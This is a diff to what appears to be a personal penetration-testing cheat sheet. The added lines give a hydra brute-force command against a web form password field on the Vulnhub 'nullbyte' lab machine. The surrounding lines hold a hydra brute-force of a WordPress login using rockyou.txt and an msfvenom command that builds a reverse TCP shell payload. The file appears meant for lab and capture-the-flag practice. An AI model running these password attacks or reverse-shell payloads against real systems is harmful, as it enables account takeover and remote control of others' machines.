@@ -206,6 +206,10 @@ bruteforcing wplogin hydra
 hydra -l admin -P /home/kali/Desktop/10.11.1/rockyou.txt 10.11.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log 
 In&testcookie=1:S=Location'
 
+
+Post request brute force without admin field:
+hydra -l "" -P /usr/share/dirb/wordlists/big.txt 192.168.1.107 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" #Machine nullbyte from vulnhub
+
 Msfvenom JS payload:
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.11944 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
 
